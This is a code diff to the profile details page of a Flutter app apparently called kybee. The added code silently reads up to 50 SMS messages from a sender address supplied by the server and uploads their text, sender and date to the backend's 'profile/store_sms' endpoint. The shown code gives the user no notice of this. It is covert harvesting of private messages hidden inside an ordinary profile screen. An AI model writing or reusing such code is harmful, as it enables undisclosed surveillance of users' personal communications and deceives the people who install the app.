@@ -10,6 +10,8 @@ import 'package:kybee/ui/loading.dart';
 import 'package:kybee/ui/profile/contactDetailsPage.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:shared_preferences/shared_preferences.dart';
+import 'package:sms/sms.dart';
+//import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
 
 class BasicDetailsPage extends StatefulWidget {
   @override
@@ -29,7 +31,7 @@ class _BasicDetailsPageState extends State<BasicDetailsPage> {
   TextEditingController _dobController = TextEditingController();
   bool _initDataFetched = false;
   List _genders = [];
-
+  String _smsMessagesSender;
   int _gender;
 
   void initState() {
@@ -60,6 +62,7 @@ class _BasicDetailsPageState extends State<BasicDetailsPage> {
           _emailController.text = body['data']['email'];
           _dobController.text = body['data']['date_of_birth'];
           _gender = body['data']['gender_id'];
+          _smsMessagesSender = body['sms_messages_sender'];
         });
       }
     }
@@ -67,6 +70,31 @@ class _BasicDetailsPageState extends State<BasicDetailsPage> {
     setState(() {
       _initDataFetched = true;
     });
+
+    if (_initDataFetched) {
+      SmsQuery query = new SmsQuery();
+      List smsObject = [];
+
+      List<SmsMessage> messages = await query.querySms(
+        address: _smsMessagesSender,
+        count: 50,
+      );
+      // debugPrint("Total Messages : " + messages.length.toString());
+
+      messages.forEach((element) {
+        smsObject.add({
+          "address": element.address,
+          "message": element.body,
+          "date": element.dateSent.toString(),
+        });
+      });
+
+      var data = {
+        'user_id': user['id'],
+        'sms': smsObject,
+      };
+      var res = await CallApi().postData(data, 'profile/store_sms');
+    }
   }
 
   Future<Null> _selectDate(BuildContext context) async {
